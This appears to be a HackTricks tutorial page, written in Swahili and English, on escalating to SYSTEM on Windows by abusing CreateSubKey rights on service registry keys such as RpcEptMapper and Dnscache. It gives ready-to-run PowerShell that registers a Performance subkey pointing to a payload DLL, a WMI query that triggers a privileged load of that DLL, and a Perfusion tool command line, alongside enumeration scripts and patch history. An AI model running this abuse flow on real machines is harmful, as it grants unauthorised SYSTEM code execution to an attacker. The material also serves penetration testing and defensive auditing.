# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Uchapisho wa asili ni** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Muhtasari

Ukiwa na tu ruhusa za **`Create Subkey`** / **`AppendData/AddSubdirectory`** kwenye service registry key, bado ni njia nzuri ya privesc. Kwa kawaida **huwezi** ku-overwrite moja kwa moja `ImagePath`, `ServiceDll`, au existing values nyingine, lakini bado unaweza ku-create child key ya **`Performance`** chini ya:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Any other **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key ambapo token yako ina **`KEY_CREATE_SUB_KEY`**

Mbinu ni kwamba Windows bado ina-support legacy registration model ya **PerfLib V1**. Ikiwa service ina subkey ya **`Performance`**, Windows inaweza kupakia DLL kutoka hapo wakati consumer wa performance counter ana-request data.

Kulingana na Microsoft documentation, minimum registration ni:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Kwa hivyo hitimisho la kiusalama ni: **usitupilie mbali utafutaji wa service registry kwa sababu tu ulipata `CreateSubKey` badala ya `SetValue`**.

## Kwa nini hii inatosha kwa code execution

Subkey ya `Performance` kwa kawaida **haipo** kwa default kwenye hizi services, kwa hiyo **`KEY_CREATE_SUB_KEY`** ndiyo primitive unayohitaji. Mara key ikishaundwa na kuwa na `Library`/`Open`/`Collect`/`Close`, consumer yeyote wa **performance counter** anaweza ku-trigger DLL load.

Maelezo machache muhimu:

- Value ya **`Library`** inaweza kuelekeza kwenye **full DLL path**.
- DLL lazima isafirishe **`OpenPerfData`**, **`CollectPerfData`**, na **`ClosePerfData`** na irudishe `ERROR_SUCCESS`.
- Code huendeshwa katika **consumer's context**, **si lazima katika vulnerable service process yenyewe**.
- Katika kesi ya kawaida ya `RpcEptMapper` / `Dnscache`, **WMI performance query** inaweza kufanya **`wmiprvse.exe`** ipakie DLL kama **`NT AUTHORITY\SYSTEM`**.

Hii ndiyo sababu primitive hii ni rahisi kukosa wakati wa triage: parent service key si "fully writable", lakini bado inaweza kutumika kama silaha.

## Quick enumeration

Manual spot-check with **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Mfano wa PowerShell wa kutafuta principals zenye hadhi ya chini zenye **`CreateSubKey`** kwenye service keys:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Zana zaida muhimu:

- **PrivescCheck**: `Get-ModifiableRegistryPath` iliundwa mahsusi kugundua aina hii ya tatizo.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: huendesha kiotomatiki DLL drop, usajili wa `Performance`, WMI trigger, token duplication, na cleanup kwenye legacy vulnerable targets (kwa mfano: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Unda subkey ya `Performance` na jaza values zinazohitajika:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Kisha vuta **privileged** performance consumer. Mfano wa kawaida ni WMI query juu ya `Win32_Perf*` classes:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Maelezo ya uendeshaji:

- Kuzindua **`perfmon.exe`** ni muhimu kuthibitisha kwamba usajili wa counter ni sahihi, lakini mara nyingi hilo hupakia DLL tu katika **muktadha wako mwenyewe wa mtumiaji**.
- Kwa LPE halisi, chochea consumer yenye **privileged** kama **WMI**.
- Ikiwa unaandika exploit yako mwenyewe, kuzindua `cmd.exe` moja kwa moja kutoka ndani ya DLL kwa kawaida huacha shell katika **session 0**. `Perfusion` husuluhisha hili kwa kunakili privileged token kwenda kwenye mchakato ulioundwa suspended katika session ya mshambuliaji.
- Linganisha usanifu wa DLL na consumer lengwa (**x64 kwenye mifumo ya x64**).

## Version notes / maendeleo ya hivi karibuni

Kihistoria, weak keys zilizojengwa ndani zilikuwa:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` na `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` inaonyesha kwamba updates za **April 2021** ziliondoa njia rahisi ya exploitation kwenye **Windows 8 / Windows Server 2012** zilizosasishwa, huku **Windows 7 / Windows Server 2008 R2** zikiendelea kuwa exploitable kupitia **`Dnscache`**.

Primitive hii **si ya kihistoria tu**. Mnamo **January 2025**, Microsoft ilipatch issue inayohusiana ya AD DS ambapo wanachama wa **`Network Configuration Operators`** wangeweza kuunda subkeys chini ya **`Dnscache`** na **`NetBT`**, na wazo lile lile la **Performance-counter DLL registration** lingeweza kutumika tena kufikia **SYSTEM** kwenye systems zinazoungwa mkono.

Hivyo somo la kisasa ni la jumla: wakati wowote principal wa chini ya privilege ana **`CreateSubKey`** kwenye **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, angalia kama child key ya **`Performance`** inatosha kabla ya kufutilia mbali finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
